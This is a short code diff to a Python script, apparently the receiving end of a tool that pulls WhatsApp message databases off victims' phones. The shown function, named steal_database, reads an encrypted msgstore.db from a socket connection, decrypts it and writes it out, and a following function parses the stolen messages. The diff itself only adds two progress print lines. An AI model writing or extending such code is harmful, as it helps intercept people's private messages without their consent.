@@ -35,13 +35,13 @@ def steal_database():
                 db.write(database)
                 database = conn.recv(2048)
             db.write(database)
-
+        print("Encrypted database has been received")
         with open('msgstore.db.enc', 'rb') as db_enc:
             with open("msgstore.db", 'wb') as db:
                 enc_data = db_enc.read()
                 data = obj.decrypt(enc_data)
                 db.write(data)
-
+        print("Database has been decrypted")
 # Parses WhatsApp message database and stores the messages in a dictionary
 def decode_whatsapp_messages():
     print("Starting to decode WhatsApp messages from the SQLite3 Database")
